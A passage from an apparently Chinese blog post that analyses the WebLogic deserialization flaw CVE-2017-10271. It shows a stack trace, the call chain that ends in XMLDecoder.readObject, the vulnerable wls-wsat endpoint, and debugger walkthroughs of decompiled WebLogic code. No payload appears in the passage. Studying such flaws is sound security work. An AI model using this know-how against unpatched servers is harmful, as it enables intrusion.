class="name">ns2:stackTrace</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.beans.ObjectHandler&quot;</span> <span class="attr">file</span>=<span class="string">&quot;ObjectHandler.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;139&quot;</span> <span class="attr">method</span>=<span class="string">&quot;dequeueResult&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span> <span class="attr">file</span>=<span class="string">&quot;XMLDecoder.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;206&quot;</span> <span class="attr">method</span>=<span class="string">&quot;readObject&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.wsee.workarea.WorkContextXmlInputAdapter&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WorkContextXmlInputAdapter.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;111&quot;</span> <span class="attr">method</span>=<span class="string">&quot;readUTF&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.workarea.spi.WorkContextEntryImpl&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WorkContextEntryImpl.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;92&quot;</span> <span class="attr">method</span>=<span class="string">&quot;readEntry&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.workarea.WorkContextLocalMap&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WorkContextLocalMap.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;179&quot;</span> <span class="attr">method</span>=<span class="string">&quot;receiveRequest&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.workarea.WorkContextMapImpl&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WorkContextMapImpl.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;163&quot;</span> <span class="attr">method</span>=<span class="string">&quot;receiveRequest&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.wsee.jaxws.workcontext.WorkContextServerTube&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WorkContextServerTube.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;71&quot;</span> <span class="attr">method</span>=<span class="string">&quot;receive&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.wsee.jaxws.workcontext.WorkContextTube&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WorkContextTube.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;107&quot;</span> <span class="attr">method</span>=<span class="string">&quot;readHeaderOld&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.wsee.jaxws.workcontext.WorkContextServerTube&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WorkContextServerTube.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;43&quot;</span> <span class="attr">method</span>=<span class="string">&quot;processRequest&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.ws.api.pipe.Fiber&quot;</span> <span class="attr">file</span>=<span class="string">&quot;Fiber.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;866&quot;</span> <span class="attr">method</span>=<span class="string">&quot;__doRun&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.ws.api.pipe.Fiber&quot;</span> <span class="attr">file</span>=<span class="string">&quot;Fiber.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;815&quot;</span> <span class="attr">method</span>=<span class="string">&quot;_doRun&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.ws.api.pipe.Fiber&quot;</span> <span class="attr">file</span>=<span class="string">&quot;Fiber.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;778&quot;</span> <span class="attr">method</span>=<span class="string">&quot;doRun&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.ws.api.pipe.Fiber&quot;</span> <span class="attr">file</span>=<span class="string">&quot;Fiber.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;680&quot;</span> <span class="attr">method</span>=<span class="string">&quot;runSync&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.ws.server.WSEndpointImpl$2&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WSEndpointImpl.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;403&quot;</span> <span class="attr">method</span>=<span class="string">&quot;process&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.ws.transport.http.HttpAdapter$HttpToolkit&quot;</span> <span class="attr">file</span>=<span class="string">&quot;HttpAdapter.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;539&quot;</span> <span class="attr">method</span>=<span class="string">&quot;handle&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.ws.transport.http.HttpAdapter&quot;</span> <span class="attr">file</span>=<span class="string">&quot;HttpAdapter.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;253&quot;</span> <span class="attr">method</span>=<span class="string">&quot;handle&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.ws.transport.http.servlet.ServletAdapter&quot;</span> <span class="attr">file</span>=<span class="string">&quot;ServletAdapter.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;140&quot;</span> <span class="attr">method</span>=<span class="string">&quot;handle&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.wsee.jaxws.WLSServletAdapter&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WLSServletAdapter.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;171&quot;</span> <span class="attr">method</span>=<span class="string">&quot;handle&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.wsee.jaxws.HttpServletAdapter$AuthorizedInvoke&quot;</span> <span class="attr">file</span>=<span class="string">&quot;HttpServletAdapter.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;708&quot;</span> <span class="attr">method</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.security.acl.internal.AuthenticatedSubject&quot;</span> <span class="attr">file</span>=<span class="string">&quot;AuthenticatedSubject.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;363&quot;</span> <span class="attr">method</span>=<span class="string">&quot;doAs&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.security.service.SecurityManager&quot;</span> <span class="attr">file</span>=<span class="string">&quot;SecurityManager.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;146&quot;</span> <span class="attr">method</span>=<span class="string">&quot;runAs&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.wsee.util.ServerSecurityHelper&quot;</span> <span class="attr">file</span>=<span class="string">&quot;ServerSecurityHelper.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;103&quot;</span> <span class="attr">method</span>=<span class="string">&quot;authenticatedInvoke&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.wsee.jaxws.HttpServletAdapter$3&quot;</span> <span class="attr">file</span>=<span class="string">&quot;HttpServletAdapter.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;311&quot;</span> <span class="attr">method</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.wsee.jaxws.HttpServletAdapter&quot;</span> <span class="attr">file</span>=<span class="string">&quot;HttpServletAdapter.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;336&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.wsee.jaxws.JAXWSServlet&quot;</span> <span class="attr">file</span>=<span class="string">&quot;JAXWSServlet.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;99&quot;</span> <span class="attr">method</span>=<span class="string">&quot;doRequest&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.servlet.http.AbstractAsyncServlet&quot;</span> <span class="attr">file</span>=<span class="string">&quot;AbstractAsyncServlet.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;99&quot;</span> <span class="attr">method</span>=<span class="string">&quot;service&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;javax.servlet.http.HttpServlet&quot;</span> <span class="attr">file</span>=<span class="string">&quot;HttpServlet.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;820&quot;</span> <span class="attr">method</span>=<span class="string">&quot;service&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.servlet.internal.StubSecurityHelper$ServletServiceAction&quot;</span> <span class="attr">file</span>=<span class="string">&quot;StubSecurityHelper.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;227&quot;</span> <span class="attr">method</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.servlet.internal.StubSecurityHelper&quot;</span> <span class="attr">file</span>=<span class="string">&quot;StubSecurityHelper.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;125&quot;</span> <span class="attr">method</span>=<span class="string">&quot;invokeServlet&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.servlet.internal.ServletStubImpl&quot;</span> <span class="attr">file</span>=<span class="string">&quot;ServletStubImpl.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;301&quot;</span> <span class="attr">method</span>=<span class="string">&quot;execute&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.servlet.internal.ServletStubImpl&quot;</span> <span class="attr">file</span>=<span class="string">&quot;ServletStubImpl.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;184&quot;</span> <span class="attr">method</span>=<span class="string">&quot;execute&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.servlet.internal.WebAppServletContext$ServletInvocationAction&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WebAppServletContext.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;3732&quot;</span> <span class="attr">method</span>=<span class="string">&quot;wrapRun&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.servlet.internal.WebAppServletContext$ServletInvocationAction&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WebAppServletContext.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;3696&quot;</span> <span class="attr">method</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.security.acl.internal.AuthenticatedSubject&quot;</span> <span class="attr">file</span>=<span class="string">&quot;AuthenticatedSubject.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;321&quot;</span> <span class="attr">method</span>=<span class="string">&quot;doAs&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.security.service.SecurityManager&quot;</span> <span class="attr">file</span>=<span class="string">&quot;SecurityManager.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;120&quot;</span> <span class="attr">method</span>=<span class="string">&quot;runAs&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.servlet.internal.WebAppServletContext&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WebAppServletContext.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;2273&quot;</span> <span class="attr">method</span>=<span class="string">&quot;securedExecute&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.servlet.internal.WebAppServletContext&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WebAppServletContext.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;2179&quot;</span> <span class="attr">method</span>=<span class="string">&quot;execute&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.servlet.internal.ServletRequestImpl&quot;</span> <span class="attr">file</span>=<span class="string">&quot;ServletRequestImpl.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;1490&quot;</span> <span class="attr">method</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.work.ExecuteThread&quot;</span> <span class="attr">file</span>=<span class="string">&quot;ExecuteThread.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;256&quot;</span> <span class="attr">method</span>=<span class="string">&quot;execute&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.work.ExecuteThread&quot;</span> <span class="attr">file</span>=<span class="string">&quot;ExecuteThread.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;221&quot;</span> <span class="attr">method</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">ns2:stackTrace</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">ns2:exception</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">detail</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">S:Fault</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">S:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">S:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2024/10/22/WebSecurity/cve/CVE-2017-10271/image-3.png"><br>分析调用栈，我们重点关注下面的调用流程：</p><ul><li>weblogic.wsee.jaxws.workcontext.WorkContextServerTube-&gt;processRequest</li><li>weblogic.wsee.jaxws.workcontext.WorkContextTube-&gt;readHeaderOld</li><li>weblogic.wsee.jaxws.workcontext.WorkContextServerTube-&gt;receive</li><li>weblogic.workarea.WorkContextMapImpl-&gt;receiveRequest</li><li>weblogic.workarea.WorkContextLocalMap-&gt;receiveRequest</li><li>weblogic.workarea.spi.WorkContextEntryImpl-&gt;readEntry</li><li>weblogic.wsee.workarea.WorkContextXmlInputAdapter-&gt;readUTF</li><li>java.beans.XMLDecoder-&gt;readObject</li></ul><p>回到漏洞利用时的漏洞地址：<code>POST /wls-wsat/CoordinatorPortType HTTP/1.1</code>，可以看到形成漏洞的接口应当是<code>wls-wsat</code>，查看源文件可以看到servlet映射关系<br><img src="/2024/10/22/WebSecurity/cve/CVE-2017-10271/image-4.png"></p><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>具体的步骤流程，我把断点打在了 <code>weblogic.wsee.jaxws.WLSServletAdapter</code> 类的handle函数，接下来跟进分析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(ServletContext var1, HttpServletRequest var2, HttpServletResponse var3)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (var2.getMethod().equals(<span class="string">&quot;GET&quot;</span>) || var2.getMethod().equals(<span class="string">&quot;HEAD&quot;</span>)) &#123;</span><br><span class="line">        <span class="type">HttpMetadataPublisher</span> <span class="variable">var4</span> <span class="operator">=</span> (HttpMetadataPublisher)<span class="built_in">this</span>.endpoint.getSPI(HttpMetadataPublisher.class);</span><br><span class="line">        <span class="keyword">if</span> (var4 != <span class="literal">null</span> &amp;&amp; var4.handleMetadataRequest(<span class="built_in">this</span>, <span class="built_in">this</span>.createConnection(var1, var2, var3))) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.isOraWsdlMetadataQuery(var2.getQueryString())) &#123;</span><br><span class="line">            <span class="built_in">this</span>.publishWSDL(<span class="built_in">this</span>.createConnection(var1, var2, var3));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">super</span>.handle(var1, var2, var3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码定义了一个 <code>handle</code> 方法，用于处理来自 Web 服务的 HTTP 请求。它是在一个可能属于 SOAP 或 REST Web服务的 Java 类中，处理特定类型的 HTTP 请求，尤其是针对元数据和 WSDL 发布。以下是对这个函数各部分的详细分析：<br>参数</p><ul><li><code>ServletContext var1</code>：这是一个接口，它为 servlet 定义了一个范围为整个应用的视图，使 servlet 能够获得关于其运行环境的信息。</li><li><code>HttpServletRequest var2</code>：表示客户端到服务器的请求信息，用于检查此次 HTTP 请求的方法和查询字符串。</li><li><code>HttpServletResponse var3</code>：表示服务器对客户端的响应，可用于设置响应的类型、内容等。</li></ul><ol><li><p><strong>检查请求方法</strong>:</p><ul><li>方法首先检查 HTTP 请求是否为 <code>GET</code> 或 <code>HEAD</code> 方法。这两种方法通常用于获取信息，不对服务器的状态进行更改。</li></ul></li><li><p><strong>处理元数据请求</strong>:</p><ul><li>如果请求方法是 <code>GET</code> 或 <code>HEAD</code>，代码尝试获取一个 <code>HttpMetadataPublisher</code> 的实例。这个实例可能是用于发布或处理与 HTTP 相关的元数据的。</li><li><code>this.endpoint.getSPI(HttpMetadataPublisher.class)</code> 方法调用可能是获取服务提供接口（SPI），用于具体的元数据发布逻辑。</li><li>如果 <code>var4.handleMetadataRequest(this, this.createConnection(var1, var2, var3))</code> 返回 <code>true</code>，说明对元数据的请求已被处理，并且没有更多的操作需要执行，方法会提前返回。</li></ul></li><li><p><strong>处理 WSDL 发布</strong>:</p><ul><li>接下来，如果请求的查询字符串是针对 WSDL 的（通过 <code>this.isOraWsdlMetadataQuery(var2.getQueryString())</code> 检查），则执行 <code>this.publishWSDL(this.createConnection(var1, var2, var3))</code>。</li><li>这一步可能涉及到 Web 服务描述语言（WSDL）的发布，它是一个 XML 格式的文档，描述了网络服务的接口，以便客户端知道如何与服务交互。</li><li>与处理元数据请求相同，如果处理了 WSDL 发布，方法也会提前返回。</li></ul></li><li><p><strong>调用父类处理方法</strong>:</p><ul><li>如果请求既不是元数据请求也不是 WSDL 查询，那么将通过调用 <code>super.handle(var1, var2, var3)</code> 来继续处理请求。这表明当前方法是在某个继承层次中，且父类也有处理请求的逻辑。</li></ul></li></ol><p>接下来跟进到：AuthenticatedSubject.java 的 doAs 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">doAs</span><span class="params">(AbstractSubject var1, PrivilegedExceptionAction var2)</span> <span class="keyword">throws</span> PrivilegedActionException &#123;</span><br><span class="line">        <span class="keyword">if</span> (var2 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(SecurityLogger.getNullAction());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">var3</span> <span class="operator">=</span> SubjectManager.getSubjectManager().getSize();</span><br><span class="line">            SubjectManager.getSubjectManager().pushSubject(var1, <span class="built_in">this</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">var11</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                var11 = <span class="literal">true</span>;</span><br><span class="line">                var4 = var2.run();</span><br><span class="line">                var11 = <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RuntimeException var12) &#123;</span><br><span class="line">                <span class="keyword">throw</span> var12;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var13) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PrivilegedActionException</span>(var13);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (var11) &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">var7</span> <span class="operator">=</span> SubjectManager.getSubjectManager().getSize();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">while</span>(var7-- &gt; var3) &#123;</span><br><span class="line">                        SubjectManager.getSubjectManager().popSubject(var1);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">var5</span> <span class="operator">=</span> SubjectManager.getSubjectManager().getSize();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(var5-- &gt; var3) &#123;</span><br><span class="line">                SubjectManager.getSubjectManager().popSubject(var1);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> var4;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这段 Java 代码是一个实现特权动作执行的函数，通常用在安全敏感的环境中，比如 Java 的安全框架中。它的功能是在特定的安全上下文中执行传入的 <code>PrivilegedExceptionAction</code> 动作。下面是对这个函数 <code>doAs</code> 的逐步分析：<br>参数</p><ul><li><code>AbstractSubject var1</code>: 这个参数代表的是执行动作的主体（subject），在安全框架中用于表示操作的执行者。</li><li><code>PrivilegedExceptionAction var2</code>: 这是一个函数式接口，定义了需要在特定权限上下文中执行的操作。</li></ul><p>功能</p><ol><li><strong>参数校验</strong>: 函数首先检查 <code>var2</code> 是否为 null。如果是 null，则抛出一个 <code>SecurityException</code>，表示不能执行空的操作。</li><li><strong>主体上下文的推入</strong>: 在执行动作之前，函数使用 <code>SubjectManager.getSubjectManager().pushSubject(var1, this)</code> 将当前主体 <code>var1</code> 推入主体管理器的栈中。这是为了设置当前的安全上下文。</li><li><strong>执行动作</strong>:<ul><li>使用 <code>try</code> 块来执行 <code>var2.run()</code>，即执行传入的特权操作。</li><li>如果在执行过程中发生 <code>RuntimeException</code>，则直接将这个异常抛出。</li><li>如果发生其他类型的 <code>Exception</code>，则将其封装在一个 <code>PrivilegedActionException</code> 中抛出，这是为了处理特权操作可能抛出的检查型异常。</li></ul></li><li><strong>异常处理</strong>:<ul><li><code>finally</code> 块确保无论 <code>var2.run()</code> 执行过程中发生什么情况（包括异常），都将当前主体从主体管理器的栈中弹出，直到栈的大小回到初始状态 <code>var3</code>。</li><li>这一步是必要的，以确保安全上下文在操作完成后能恢复到原始状态，防止安全漏洞。</li></ul></li><li><strong>恢复主体上下文</strong>:<ul><li>在 <code>try</code> 块后，有另一个循环用于处理异常外的情况，同样确保主体栈被正确清理。</li></ul></li></ol><p>上面流程太长了，下面直接把断点打在<code>weblogic.wsee.jaxws.workcontext.WorkContextServerTube</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 